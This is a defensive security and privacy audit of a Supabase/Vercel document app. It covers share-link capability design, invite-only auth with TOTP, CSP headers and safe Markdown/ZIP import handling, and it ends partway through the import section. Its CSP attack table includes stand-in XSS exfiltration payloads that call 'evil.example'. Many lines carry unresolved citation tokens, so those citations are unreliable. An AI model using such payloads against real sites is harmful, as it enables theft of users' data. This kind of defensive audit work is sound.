# GeminiForge Workbench Security and Privacy Audit

**Audit date:** October 22, 2026  
**Scope:** application security, authentication, sharing, browser security, untrusted content/imports, repository/CI/supply chain, privacy, audit logging, abuse resilience, and incident response. MCP/token design is intentionally excluded except where it intersects the browser/app boundary.  
**Assumption:** production remains on the generated `*.vercel.app` hostname with no custom domain, and the intentionally public built-in project remains an explicit exception to the otherwise private-by-default model.

The updated context says the live application has 33 public-schema tables with RLS enabled, roughly 42 `SECURITY DEFINER` functions in `public`, a separate `private` permission-helper schema, password-only authentication, no CSP or `vercel.json`, and a currently public GitHub repository without dependency/secret/code scanning. fileciteturn0file0 fileciteturn0file3 The updated master plan already proposes several sound controls—fragment share secrets, SHA-256 storage, explicit grants, sanitization, TOTP, CSP, supply-chain checks—but several of those controls need modification. fileciteturn0file1

## Executive findings and threat model

**Executive summary — ranked findings**

| Rank | Finding | Risk now | Effort | Decision |
|---|---|---:|---:|---|
| 1 | **The owner’s GitHub/Vercel/Supabase/Google identities are the real root of trust.** A takeover of one can bypass most in-app controls. Turn on the strongest phishing-resistant MFA each account currently supports, keep offline recovery material, and test recovery. | Critical | S | Do now |
| 2 | **Do not implement the planned public anonymous `SECURITY DEFINER` share RPC as the browser-facing interface.** Put share redemption behind a server/Edge proxy with a secret key; give share browsers no Supabase Data API, Realtime or Storage credentials. | Critical | M | MODIFY |
| 3 | **Change `/#/s/<secret>` to a non-secret route plus fragment, preferably `/share#<secret>`.** URL fragments are not sent in the HTTP request, but keeping routing and capability in one hash prevents route-specific server headers and complicates removal of the capability. citeturn0search14turn0search0turn20view1 | High | S | MODIFY |
| 4 | **Do not auto-redeem a share link merely because the page loaded.** Require an explicit **Open shared project** click, then redeem, then remove the secret with `history.replaceState`. This materially reduces link-preview/scanner exposure. | High | S | Add |
| 5 | **For invite-only account creation, keep passwords but bind server-side account creation to your existing invitation token, disable public signup, and require TOTP for privileged users.** TOTP is currently free in Supabase; passkeys exist but remain experimental. citeturn22view2turn22view3 | High | M | Recommended |
| 6 | **Your missing CSP/security headers are an immediate browser-hardening gap.** Add them before opening project-wide public sharing. Your current CSS is stored as an inline CSS string, so move it to a Vite-imported `.css` file before enforcing `style-src 'self'`. fileciteturn0file3 | High | S/M | Do now |
| 7 | **Untrusted Markdown/imports are a higher practical application risk than sophisticated cryptographic attacks.** No raw HTML, no remote images in review/share contexts, no uploaded SVG, strict URL schemes, and a sanitizer after the last untrusted transformation. citeturn7search1turn7search2 | High | M | Do before imports |
| 8 | **Defer `.docx` import until you can pin Mammoth to at least the release fixing all known 2025–2026 issues and run it inside a constrained Worker.** Mammoth had directory-traversal/file-disclosure, prototype-pollution/file-disclosure, and later ReDoS issues in this period. citeturn22view16turn22view17turn8search9 | High | S now / M later | MODIFY |
| 9 | **The public repository currently receives valuable free GitHub security coverage, but it also makes any committed fixtures, endpoints and historical mistakes public.** First run full-history secret scanning; if any real document/email/test data exists in history, privacy outweighs public-repo convenience and the repository should become private after equivalent OSS checks are in CI. citeturn22view7turn10search12 | High | S | Audit immediately |
| 10 | **Treat the roughly 42 `SECURITY DEFINER` functions as an attack-surface inventory, not an advisor-warning count.** Publicly callable application RPCs may remain in `public`; internal functions should move to `private`, lose API-role `EXECUTE`, use `search_path=''`, and schema-qualify every object. fileciteturn0file3 | High | M | Do now |
| 11 | **The Gmail invitation endpoint must never be a generic mail relay.** Require authenticated privileged callers, AAL2, an existing invite row, server-generated recipient/body/subject, and small database-backed quotas. The exact consumer Gmail SMTP daily ceiling is **UNVERIFIED** and must not be your security boundary. | High | S | Harden |
| 12 | **Share-link revocation should be immediate and checked on every fetch.** Do not mint an independently reusable share JWT and do not CDN-cache successful share responses. `Cache-Control: no-store` is appropriate. | High | S | Recommended |
| 13 | **Build a small structured application security log.** Supabase/Vercel platform logs are operational logs, not a durable app audit trail; a security-only append-only table is easier to reason about than continuous `pgaudit`. | Medium | M | Recommended |
| 14 | **Reduce retained personal data.** After an invitation succeeds/expires, remove the duplicate invite-table email when no longer needed; keep the Auth email because email/password authentication requires it. Hashing an email is not equivalent to deleting personal data. | Medium | S | MODIFY |
| 15 | **Add an emergency path before adding sharing:** one owner-only AAL2 action to disable all public sharing, documented secret rotation, tested account recovery, and an incident checklist. | Medium/High | S | Do now |

The planned 256-bit random share secret itself is not the weak point. Even at an unrealistically sustained one billion independent guesses per second for a year, the chance of guessing one uniformly random 256-bit capability is about \(2.7\times10^{-61}\). The practical threats are leakage, overly broad projection, stolen owner credentials, XSS, supply-chain compromise, and free-tier exhaustion.

**Threat model**

The principal assets are canonical and revision document content; organization/project membership; invitation email addresses; share capabilities; Auth accounts and sessions; document review/draft data; audit information; and the owner’s GitHub, Vercel, Supabase and Google identities. The PDFs confirm that document content is meant to be private except through explicit sharing and that AI/collaborator content can be untrusted. fileciteturn0file0

Actors are:

- anonymous Internet users and automated bots;
- authenticated users with no membership;
- project viewers, editors and managers;
- organization members/admins/owners;
- a curious or malicious invitee;
- someone who obtains a project capability URL;
- malicious Markdown/imported files/AI-proposed content;
- compromised npm/GitHub Actions dependencies;
- link scanners, crawlers, preview/unfurl services and browser extensions;
- and an attacker controlling one of the owner’s infrastructure accounts.

The important trust boundaries are browser ↔ Vercel, browser ↔ Supabase Auth/Data API, public share browser ↔ share proxy, Vercel/Edge server ↔ Supabase secret key, authenticated application ↔ RLS, untrusted document text ↔ rendered DOM, imported archive ↔ application memory/files, GitHub dependency build ↔ deployment secrets, and the owner ↔ the four infrastructure control planes.

**STRIDE assessment**

| Threat | Concrete case for GeminiForge | Likelihood | Impact | Priority/control |
|---|---|---:|---:|---|
| Spoofing | Stolen owner password or session | Medium | Critical | MFA/AAL2; root-account MFA; session recovery |
| Spoofing | Stolen invite link creates account for attacker | Medium | High | Fragment token, explicit accept, short expiry, email binding |
| Spoofing | Stolen project share URL | Medium | High | Capability hygiene, per-recipient links, expiry/revocation |
| Tampering | Editor modifies content outside intended scope | Medium | High | RLS + role matrix |
| Tampering | Accepted malicious AI/import content triggers active DOM | Medium | Critical | sanitize/render-as-data |
| Tampering | Malicious npm install lifecycle modifies build | Low/Medium | Critical | lockfile, cooldown, no build secrets, scanning |
| Repudiation | Privileged role/share change has no durable record | Medium | Medium | structured append-only events |
| Information disclosure | Share projection accidentally includes revisions/members/drafts | Medium | Critical | explicit allowlist projection |
| Information disclosure | Remote Markdown image exfiltrates data/context | Medium | High | no remote images |
| Information disclosure | Referrer/history/extension leaks capability | Medium | High | fragment, no-referrer, explicit redeem, remove fragment |
| Information disclosure | Repo/test artifact contains user data or old secret | Medium | Critical | history scan; public/private decision |
| Denial of service | Anonymous share calls consume Edge quota | Medium | Medium/High | rate buckets, bot controls, kill switch |
| Denial of service | ZIP/docx bomb exhausts browser memory | Medium | High | Worker + emitted-byte/entry/ratio caps |
| Elevation | Overbroad `SECURITY DEFINER` RPC reachable by signed-in non-member | Medium | Critical | classify/revoke/private schema/permission recheck |
| Elevation | Secret Supabase key reaches browser/build log | Low/Medium | Critical | separate runtime secret, rotation plan |

For this app, **authorization mistakes and content/supply-chain attacks outrank brute-force attacks**. Your small user base reduces ordinary account-abuse volume, but it does not reduce the impact of compromising the sole owner.

## Security architecture review

**C1 — Project-wide share links**

**Single recommendation:** keep the project-wide, read-only, expiring/revocable capability model, but **MODIFY the implementation to `/share#<32-byte-base64url-secret>` + an explicit user gesture + an Edge/server proxy that returns a deliberately reduced projection. Do not expose an anonymous Data API RPC and do not mint share-viewer JWTs.**

The W3C TAG capability-URL work treats possession of the URL as the authority to access the resource and explicitly discusses history, referers, logs, third-party content, crawlers and sharing as leakage channels. It is useful design guidance but is a retired/draft TAG finding rather than a current normative Web standard. citeturn22view0 Its entropy guidance comfortably supports your planned 256-bit secret. The stronger browser property comes from the URI architecture itself: MDN states that a fragment is not sent to the server with the resource request. citeturn0search14 The Referrer Policy specification likewise strips fragments from referrer URLs. citeturn20view1turn0search0

**Architecture comparison**

| Architecture | Advantages | Security disadvantages | Free-tier effect | Verdict |
|---|---|---|---|---|
| Anonymous `SECURITY DEFINER` RPC returning JSON | Fewest moving parts; no Edge invocation | Must grant anonymous API execution; public browser directly touches Data API; easy to accidentally enlarge projection; harder to keep sharing completely distinct from normal API surface | Lowest runtime cost | **Reject for browser-facing sharing** |
| Edge validates secret and mints short-lived custom JWT | RLS can consume claims; later API calls are cheap | Adds signing/claim/audience/revocation complexity; a mistakenly accepted JWT can reach REST/Storage/Realtime; revocation is delayed until JWT expiry | Edge invocation plus ongoing API traffic | **Reject** |
| Edge Function/server proxy validates capability and returns data | Browser receives no Supabase privilege; one place for projection/rate limiting/revocation; Storage/Realtime never exposed | One function invocation per fetch; proxy is itself a DoS target | Supabase Free Edge allowance must be watched | **Choose** |

The current Supabase Functions limits page lists **“Maximum Memory: 256MB”** and **“Maximum CPU Time: 2s”** per request; Free wall-clock duration is also separately limited. citeturn22view12 The Free-plan invocation allowance found in Supabase’s primary documentation is 500,000 invocations per billing period; that is ample for normal use by a few invited users but can be deliberately exhausted, so the share endpoint needs a kill switch and rate controls. citeturn13search4turn13search9

**Capability construction**

Generate exactly 32 random bytes with a cryptographically secure RNG. Base64url without padding produces a 43-character URL token. Store only:

```sql
create table public.share_links (
  id uuid primary key default gen_random_uuid(),
  project_id uuid not null references public.projects(id) on delete cascade,
  secret_hash bytea not null unique,
  label text,
  created_by uuid not null references auth.users(id),
  created_at timestamptz not null default now(),
  expires_at timestamptz not null,
  revoked_at timestamptz,
  last_viewed_at timestamptz,
  view_count bigint not null default 0,
  check (octet_length(secret_hash) = 32)
);

alter table public.share_links enable row level security;

revoke all on public.share_links from public, anon, authenticated;
```

Generate the raw token server-side, calculate `SHA-256(raw_token_bytes)`, insert the digest, and return the raw token exactly once to the privileged creator. Because the input is a uniformly random 256-bit secret, a slow password KDF brings negligible brute-force benefit; SHA-256 is appropriate. A slow password hash is appropriate for low-entropy human passphrases, not for 256-bit random capabilities.

The plan’s proposed “constant-time SQL compare” should be **MODIFIED**. If the server performs an indexed lookup by a cryptographic digest, an attacker cannot learn the raw secret one prefix at a time. Constant-time equality is useful if two fixed-length secret values are explicitly compared in application code, but forcing a homemade constant-time SQL routine adds complexity without solving the important leakage channels.

**Use multiple project-wide links, not one immortal project link.** “Project-wide” should describe the scope, not the number of capabilities. A link labelled “Alice review”, another “conference demo”, and another “temporary support” may all expose the entire project while remaining independently revocable. The W3C capability guidance explicitly favors separable capabilities when revocation or attribution matters. citeturn22view0 Do not require an email address merely to label a link.

**Recommended expiry policy:** seven days by default, selectable shorter durations, and no “never expires” option for public capabilities. This is an application policy recommendation, not a vendor default. For a long-running collaboration, issue a new capability rather than silently converting a public bearer capability into permanent authorization.

**Leak-channel analysis**

| Channel | Does a fragment help? | Control |
|---|---|---|
| Server/CDN/proxy request URL | Yes; fragment is not transmitted in HTTP | Use fragment, never query/path |
| `Referer` | Yes for the fragment; path/query can still leak | `Referrer-Policy: no-referrer` |
| Browser history/sync | No | Explicit redeem, then `replaceState('/share')` |
| Address bar/screen share/screenshot | No until removed | Remove immediately after explicit redeem |
| Messaging previews/unfurlers | Usually, because ordinary HTTP fetch cannot see fragment | Initial `/share` page must contain no content; require user gesture |
| Microsoft Safe Links and similar | Fragment prevents server-side fetch from receiving it, but exact 2026 JS/click behavior is **UNVERIFIED** | Never consume on GET; explicit user gesture |
| Search crawler | It can index `/share`, not retrieve content without fragment | `/share` noindex + empty initial shell; robots rule for `/share` |
| Browser extensions | No; an extension with URL/page permission may read it | Residual risk; remove promptly |
| Clipboard managers | No | Do not put capability in automatic “copy diagnostic info” |
| Analytics | No if analytics sees `location.href` | **No analytics on share shell** |
| Third-party fonts/scripts/images | Can reveal visit context and expand JS authority | None on share shell |
| Service worker | Existing same-origin SW may intercept `/share` | Keep `/share` out of offline caching; do not store payload |
| Pasting into AI/chat | No technical mitigation | UI warning: “Anyone with this link can read the project” |
| Recipient forwarding | No | Expiry, recipient-labelled independent links, revoke UI |

The initial browser flow should be:

1. Browser requests `/share`; the server never receives the fragment.
2. Minimal first-party JS reads `location.hash` but **does not redeem automatically**.
3. Page displays “Open shared project”.
4. User click POSTs the secret in the request body to the share proxy.
5. Proxy hashes it, checks existence, expiry and revocation, and builds the projection.
6. On success, JS immediately executes `history.replaceState(null, "", "/share")`.
7. Content exists only in memory; it is not placed in LocalStorage, IndexedDB, Cache Storage or a service-worker cache.
8. All external links use `rel="noopener noreferrer"`.
9. Refresh after the fragment has been removed intentionally loses access and asks the recipient to reopen the original link.

That last inconvenience is a worthwhile security property for a bearer capability.

**Exact public projection**

For a project-wide share, allow only the minimum needed to render the canonical current state:

```text
project:
  public display name
  public description, if desired

documents[]:
  opaque share-local document key
  title
  canonical current Markdown/body
  ordering/navigation fields
  canonical current updated timestamp, only if useful

plan[]:
  title
  hierarchy/order
  current status/check state
```

Explicitly exclude:

```text
auth.users
organization/project membership
invitation records and email addresses
user UUIDs and editor IDs
document authorship identities
doc_revisions and revision diffs
AI review inbox / change_sets / pending drafts
Trash / deleted_at content
comments and private annotations
tokens, token metadata and token usage
security/audit logs
verification actor identities
private notifications
normal full-text-search tables
hidden/restricted content
Storage object paths and signed URLs
Realtime topics/channels
exports/backups
internal database IDs where not required
```

If project-wide sharing literally means *every current project document*, the master plan’s proposed future per-document `restricted` flag conflicts with that definition. Either a restricted document must also be shared, or the product is no longer truly “project-wide.” I recommend not adding per-document restrictions until that semantic conflict is resolved. fileciteturn0file1

Do not expose normal project search. Either fetch the small shared corpus and search it locally or build a dedicated share-search endpoint whose project is derived solely from the validated capability.

For v1, **do not expose Storage images/attachments through project shares**. A later proxy can add deliberately shareable images, but direct Storage signed URLs become a second capability system.

**View logging:** do not create a permanent IP/user-agent surveillance log. Keep `view_count`, `last_viewed_at`, and daily per-link success/failure counters. For anonymous abuse control, an IP can be transformed into a short-lived bucket identifier using a server-only, rotating pepper and deleted after the rate window; never store the raw address.

**Attacks and proof tests**

| Attack | Example | Defence | Test |
|---|---|---|---|
| Link scanner opens invitation/share URL | Scanner performs `GET /share#secret` | Fragment absent from request; GET is inert; no auto-redeem | Assert zero share-stat change after GET |
| Attacker calls normal Supabase APIs after seeing shared project | Requests `/rest/v1/docs`, Realtime and Storage | Share browser receives no JWT/API capability; RLS/grants deny `anon` | Playwright/network + direct curl/API test |
| Capability appears in outbound referrer | User clicks external URL while secret remains | no-referrer + `replaceState` + noreferrer | External test server sees no Referer |
| Revoked link served from cache | Recipient revisits after owner revokes | no-store and link checked every request | Redeem, revoke, redeem again → generic denial |
| Brute-force enumeration | Random 43-character values | 256-bit entropy + rate control | Thousands of malformed/random requests reveal no metadata |

**Counter-argument tested:** the anonymous RPC is materially simpler and avoids Edge quota exhaustion. That is its strongest advantage. It loses because your own requirement is stronger: a share viewer should never need the normal Data API. The proxy produces a cleaner security boundary and is still operationally small for this user count.

**Case-study limitation:** I did **not** find sufficiently strong primary incident material in this run to substantiate the PDFs’ specific claims about Notion, Google Docs, BookStack or GitHub public-share leaks. Those claims are **UNVERIFIED and should be removed as evidence**, even though their proposed least-privilege conclusion is sound. The two Confluence incidents discussed later are genuine authorization incidents, but they are not capability-URL case studies. fileciteturn0file2

**Cost check:** $0. The catch is quota exhaustion: every Edge redemption consumes a free invocation. There is no paid WAF in this design.

**C2 — Supabase Auth for an invite-only Free-plan app**

**Single recommendation:** use **invite-token-bound server-created email/password accounts**, disable public signup, require TOTP/AAL2 for owner/admin/high-risk operations, and keep passkeys as a future migration after Supabase marks them stable.

Supabase documents TOTP MFA for hosted projects and currently makes it available without requiring a paid plan. citeturn22view2turn3search8 Supabase’s passkey support is now real—something older advice misses—but the current documentation still describes it as experimental; it therefore should not be your only login or recovery mechanism in October 2026. citeturn22view3turn3search7

Supabase session documentation says: **“By default, sessions last indefinitely and a user can have an unlimited number of active sessions.”** citeturn22view1 Inactivity timeout, time-boxed sessions and single-session enforcement are paid-plan controls in the current documentation, so do not design the Free deployment around them. citeturn2search0

Supabase’s leaked-password detection is also a paid control rather than a Free-plan feature. citeturn3search1 That makes strong passwords, MFA and anti-enumeration more important.

**Flow**

For an existing account:

```text
Open #/join/<token>
→ GET does nothing
→ user signs in normally
→ user explicitly clicks Accept
→ server verifies:
     token hash
     not expired
     not consumed
     authenticated user's normalized email = invited email
→ transaction inserts membership / consumes invite
```

For a new invitee:

```text
Open #/join/<token>
→ no network redemption yet
→ enter a new password
→ pass CAPTCHA
→ click Create account and join
→ POST token + password + CAPTCHA response to /api/join
→ server validates invitation
→ server calls Supabase admin.createUser(invitedEmail, password, email_confirm=true)
→ insert membership
→ consume invite
→ sign in normally
→ privileged role must enrol/verify TOTP before privileged work
```

The Supabase Admin `createUser` API is explicitly server-side and can create an already-confirmed email identity; it must never be called with the secret key from the browser. citeturn21view12turn22view6

The endpoint must be idempotent. Because Auth user creation and your application membership insert are not one PostgreSQL transaction, handle partial failure explicitly:

```ts
const invite = await validateInvite(secret);

if (!invite || invite.used || invite.expiresAt <= new Date()) {
  return genericInvalidInvite();
}

const existing = await lookupAuthUserByEmail(invite.email);

if (existing) {
  // Never silently attach an unauthenticated existing user.
  return requireExistingUserSignIn();
}

const { data, error } = await admin.auth.admin.createUser({
  email: invite.email,
  password,
  email_confirm: true,
});

if (error || !data.user) return genericJoinFailure();

try {
  await addMembershipAndConsumeInvite(data.user.id, invite.id);
} catch (e) {
  // Record/reconcile the orphan; do not report account existence to caller.
  await recordJoinReconciliation(data.user.id, invite.id);
  return genericJoinFailure();
}
```

Never log the request body, password or raw invite secret.

**Dashboard/settings baseline**

| Setting | Recommendation |
|---|---|
| Email/password | Enabled |
| Public/self signup | **Disabled** |
| Email confirmation | Keep enabled globally |
| Secure email change | Enabled |
| Password minimum | **15 characters as your conservative application policy** |
| Password composition rules | Do not require arbitrary mixed-case/symbol recipes |
| TOTP | Enabled |
| Privileged operations | Require `aal2` |
| JWT access-token lifetime | Keep around Supabase’s normal one-hour class, rather than artificially long |
| Time-box/inactivity/single-session | Not available to rely on at $0 |
| Leaked-password screening | Pro-only; unavailable under your rule |
| CAPTCHA | Cloudflare Turnstile |
| Redirects | Exact production URL + exact local development URLs; avoid production wildcards |
| Magic links | Not primary account-creation mechanism |

NIST’s modern password guidance rejects arbitrary composition-rule complexity in favor of length, blocklists and rate limiting; manually-entered OTP methods are also not phishing-resistant. citeturn3search10 TOTP therefore improves this deployment but is not as strong as a mature passkey/WebAuthn flow.

Supabase supports Cloudflare Turnstile and hCaptcha in Auth; Supabase itself describes Turnstile as a **free** CAPTCHA alternative. citeturn21view13turn19search15

For sensitive RPCs:

```sql
-- Include this condition in sensitive policies.
((select auth.jwt() ->> 'aal') = 'aal2')
```

Supabase documents this `aal2` RLS pattern. citeturn4search3turn20view5

For `SECURITY DEFINER` functions, recheck it inside the function rather than assuming the UI performed MFA:

```sql
if (select auth.jwt() ->> 'aal') is distinct from 'aal2' then
  raise exception 'MFA required'
    using errcode = '42501';
end if;
```

Require AAL2 at least for organization ownership/admin changes, creating/revoking public shares, exporting sensitive data, deleting users/projects, changing invitations, and any emergency-security RPC.

**Why not magic link/OTP as the main flow?**

One-time email links create exactly the scanner/unfurler problem you are already trying to avoid. Supabase’s passwordless links are one-time. citeturn2search10 Email OTP codes avoid automatic-link consumption but add email dependency and operational complexity. Your existing invite URL already proves control of the invited mailbox when delivered privately; an explicit account-creation POST is simpler.

Supabase documentation around invite/OTP expiry is not perfectly consistent: current user/invite documentation ties invitation validity to the project’s OTP expiration setting, while generic Auth documentation has historically described different email-link defaults. The exact live default for this project is therefore **UNVERIFIED—read the Auth dashboard value rather than relying on either textual default.** citeturn22view4turn19search12

`inviteUserByEmail` is also awkward for PKCE because invitation flows may begin in one browser/context and finish in another; Supabase documentation explicitly calls out that limitation. citeturn4search11

**Recovery**

Supabase’s application TOTP documentation did not provide a primary-source basis in this research for a built-in “recovery codes” feature. Treat recovery codes as **UNVERIFIED**, not as an existing product feature.

Before enforcing MFA on the sole application owner:

1. Test factor enrolment and unenrolment with a disposable account.
2. Document the Supabase-admin recovery procedure.
3. Keep infrastructure-account recovery material offline.
4. Keep a second independent authenticator backup only if the live Supabase Auth UI confirms multiple-factor enrolment works as expected.

**Attacks and proof tests**

| Attack | Example | Control | Test |
|---|---|---|---|
| Public account farming | `signUp(attacker@example)` directly against Auth | Public sign-up off | Direct SDK/REST signup fails |
| Invitation scanner | GETs `#/join/token` | GET inert | Invite stays unused |
| Existing-account takeover | Attacker obtains invite bound to victim email | Existing account must authenticate first | New-password route refuses existing account |
| Password-only stolen owner session | Owner logged in at AAL1 | AAL2 in DB/RPC | Sensitive RPC returns `42501` |
| Account enumeration | Repeated known/unknown emails | Generic endpoint responses | Same status/body class; timing difference bounded |

**Counter-argument tested:** magic links remove password reuse risk and are easier for low-volume invited users. For this particular threat model, scanner-safe invitation handling, zero-cost email reliability and the already-existing explicit invite token make password + TOTP simpler and more controllable. Once Supabase passkeys leave experimental status, passkeys become the preferred upgrade.

**Cost check:** $0. TOTP and Turnstile fit the zero-cost design. Breached-password detection and advanced session lifetime controls are the relevant paid-plan catches. Passkeys are currently an experimental-risk catch rather than a price catch.

**C3 — HTTP headers and CSP**

**Single recommendation:** add a Report-Only CSP now, move the inline CSS string into a real Vite CSS asset, remove Google Fonts in favor of a system stack or self-hosted font, then enforce the CSP after the browser suite is clean.

Your architecture PDF says the entire CSS currently lives as `const CSS` in `parts/20-styles.tsx`. fileciteturn0file3 An inline `<style>` created from that string requires weakening `style-src` or maintaining a brittle CSP hash. For a static Vite SPA, moving it to an imported CSS file is simpler than implementing server-generated nonces.

Google Fonts is unnecessary third-party network exposure for a private/share-oriented product. Use a system font stack. If you later self-host a font, verify that font’s license before committing it.

Because a hash route reaches Vercel as `/` regardless of the fragment, `/` and `/#/s/...` cannot receive different HTTP headers. The clean fix is the C1 route change:

```text
https://geminiforge-workbench.vercel.app/share#SECRET
```

Vercel sees `/share`; the secret remains a fragment.

**Paste-ready `vercel.json` baseline after the CSS move**

```json
{
  "$schema": "https://openapi.vercel.sh/vercel.json",
  "rewrites": [
    {
      "source": "/share",
      "destination": "/index.html"
    }
  ],
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy-Report-Only",
          "value": "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' blob: https://plbvgcnyfclillatpowc.supabase.co; font-src 'self'; connect-src 'self' https://plbvgcnyfclillatpowc.supabase.co wss://plbvgcnyfclillatpowc.supabase.co; worker-src 'self'; manifest-src 'self'; frame-src 'none'; media-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; require-trusted-types-for 'script'; trusted-types geminiforge; report-uri /api/csp-report"
        },
        {
          "key": "Referrer-Policy",
          "value": "no-referrer"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "Permissions-Policy",
          "value": "camera=(), microphone=(), geolocation=(), payment=(), usb=()"
        },
        {
          "key": "Cross-Origin-Opener-Policy",
          "value": "same-origin"
        },
        {
          "key": "Cross-Origin-Resource-Policy",
          "value": "same-origin"
        },
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains"
        },
        {
          "key": "X-Robots-Tag",
          "value": "noindex, nofollow, noarchive"
        }
      ]
    },
    {
      "source": "/share",
      "headers": [
        {
          "key": "Cache-Control",
          "value": "no-store"
        }
      ]
    },
    {
      "source": "/assets/(.*)",
      "headers": [
        {
          "key": "Cache-Control",
          "value": "public, max-age=31536000, immutable"
        }
      ]
    }
  ]
}
```

I recommend global `no-referrer` and global `noindex` rather than trying to weaken private pages merely to make share-page behavior special. You explicitly do not need SEO. This also eliminates a whole category of future hash-router mistakes.

Vercel documents configurable response headers through project configuration. citeturn20view9turn18search20 Its caching documentation supports long immutable caching for fingerprinted static assets while sensitive responses should use `no-store`. citeturn5search4

**CSP rollout**

First deploy the header above as `Content-Security-Policy-Report-Only`. The report endpoint should accept only CSP-report content types, cap the request body, and store only:

```text
timestamp
effective-directive
blocked origin, not full sensitive URL
document path after stripping query and fragment
```

Do not log the report body wholesale. The endpoint is anonymous and therefore an abuse target.

When Playwright and real-device testing show no required violations, rename it to:

```text
Content-Security-Policy
```

Trusted Types should stay Report-Only until you have verified every DOM-writing dependency. Browsers without Trusted Types simply rely on the rest of CSP and your rendering architecture.

**HSTS:** sending HSTS on the generated HTTPS deployment is reasonable. Do **not** add the `preload` token. You do not control the registrable `vercel.app` parent and therefore cannot independently manage its preload lifecycle. The parent’s current preload status was not independently checked in this run: **UNVERIFIED**.

**COOP/CORP:** `same-origin` is appropriate today because the app is not using popup-based OAuth. Re-test COOP if you later add provider OAuth or popup integrations.

**Vercel protection changed in 2026.** A September 2026 Vercel change made deployment protection available to all plans, including protection of production deployments. citeturn22view5 Password Protection remains a paid mechanism and is out under the $0 rule. citeturn18search13 Use free Vercel deployment protection for preview/deployment URLs; leave the actual production app reachable because your own Supabase authentication and public share pages must work for non-Vercel users.

**Attack scenarios**

| Attack | Payload/steps | Stops it | Test |
|---|---|---|---|
| Stored XSS finds a renderer bug | `<script>fetch('https://evil/...')</script>` | sanitizer + no raw HTML + CSP | DOM contains no script; CSP has no unsafe-inline |
| Clickjacking | Attacker `<iframe src="...">` | `frame-ancestors 'none'` + XFO | Browser refuses frame |
| Exfil through injected JS even after XSS bug | `fetch("https://evil.example/"+secret)` | `connect-src` allowlist | CSP violation; no external request |
| Capability referrer leak | Click external page from share | global no-referrer | Receiver gets no Referer |
| MIME confusion | Upload served with misleading MIME | `nosniff` + upload validation | executable response not interpreted |

**Counter-argument tested:** putting `'unsafe-inline'` in `style-src` would let the current CSS keep working immediately. That weakens CSP and preserves a nonstandard runtime CSS injection pattern for no benefit. Moving one CSS source file is the smaller long-term control.

**Cost check:** $0. Vercel headers, browser CSP and the local report function use existing infrastructure. No paid CSP reporting vendor is needed.

**C4 — Untrusted Markdown and imports**

**Single recommendation:** treat every document/import as hostile structured data; maintain a small Markdown allowlist, never interpret raw HTML, block network-capable content, run archive/document conversion in a Worker with hard emitted-data limits, and ship Markdown ZIP first while deferring `.docx`, Notion and SVG support.

`react-markdown` is designed around a syntax-tree pipeline and is safe from raw HTML execution unless unsafe features are deliberately introduced, but its default link handling is broader than this app needs. citeturn7search2turn20view11 `rehype-sanitize` is explicitly intended to make an HTML syntax tree safe according to a schema and recommends sanitizing after unsafe transforms. citeturn7search1turn20view10

**Renderer**

```tsx
import ReactMarkdown, { defaultUrlTransform } from "react-markdown";
import remarkGfm from "remark-gfm";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";

const blockedTags = new Set([
  "img",
  "iframe",
  "object",
  "embed",
  "style",
  "script",
  "svg",
  "form"
]);

const markdownSchema = {
  ...defaultSchema,
  clobberPrefix: "user-content-",
  tagNames: defaultSchema.tagNames?.filter((tag) => !blockedTags.has(tag)),
  protocols: {
    ...defaultSchema.protocols,
    href: ["https", "mailto"]
  }
};

function safeUrlTransform(url: string, key: string, node: unknown): string {
  if (url.startsWith("#")) return url;

  // Internal absolute path; reject protocol-relative URLs.
  if (url.startsWith("/") && !url.startsWith("//")) return url;

  try {
    const parsed = new URL(url);
    if (parsed.protocol === "https:" || parsed.protocol === "mailto:") {
      return url;
    }
  } catch {
    // Invalid/relative non-internal URL.
  }

  return "";
}

export function SafeMarkdown({ children }: { children: string }) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={[[rehypeSanitize, markdownSchema]]}
      skipHtml
      urlTransform={safeUrlTransform}
      components={{
        a: ({ children, ...props }) => (
          <a {...props} rel="noopener noreferrer">
            {children}
          </a>
        ),
        img: () => null
      }}
    >
      {children}
    </ReactMarkdown>
  );
}
```

Do **not** add `rehype-raw`. Do not use `dangerouslySetInnerHTML` for content. Search snippets and diffs should be text nodes with application-created `<mark>` elements, exactly as the new master plan already suggests. fileciteturn0file1

Heading IDs are a DOM-clobbering surface. Either do not generate IDs from arbitrary headings or prefix every generated ID with `user-content-`; `rehype-sanitize` documents this style of clobber-prefix defense. citeturn20view10

**Images/SVG**

For v1, accept only raster images you deliberately support. Reject uploaded `.svg`. An SVG is an active XML-based format with enough complexity that “sanitize arbitrary SVG safely” is not worth adding to a documentation project.

For raster imports, decode then re-encode before storage if you need to remove EXIF/GPS metadata. Enforce compressed-file and pixel-dimension limits before doing expensive transforms wherever possible. If you do not need imported images yet, the safest and smallest implementation is to skip them with a warning.

**Front matter**

Do not merge arbitrary YAML maps into application state.

Recommended model:

```text
Parse front matter only when a supported importer needs it.
Accept only known scalar keys.
Reject custom YAML tags.
Reject aliases/anchors if the parser permits disabling them.
Reject keys: __proto__, prototype, constructor.
Copy accepted data into a freshly-created null-prototype object.
Limit front-matter bytes, nesting and scalar lengths.
Keep unknown fields as inert text or discard them.
```

**CSV/export injection**

When producing CSV intended for spreadsheet software, neutralize cells whose first non-whitespace character is `=`, `+`, `-` or `@`; alternatively, make JSON and Markdown the default exports and keep CSV explicitly labelled as a spreadsheet-risk format. Never treat imported CSV cells as formulas.

**ZIP policy**

Recommended limits are application policy—not vendor defaults:

```text
compressed archive:      25 MiB maximum
total emitted contents: 100 MiB maximum
one entry:               10 MiB maximum
entries:                  1,000 maximum
compression ratio:        100:1 maximum
directory nesting:        20 levels maximum
filename:                 240 characters maximum
nested archives:          do not recurse automatically
symlinks/hardlinks:       reject
absolute paths:           reject
../ components:           reject
drive/UNC paths:          reject
NUL:                      reject
normalization collisions: reject
Windows reserved names:   reject
```

Those values are deliberately conservative for your few-hundred-page, browser-based workspace and may be adjusted after memory tests.

Do not trust ZIP central-directory “uncompressed size” alone: count bytes actually emitted by the decompressor and abort when the limit is crossed.

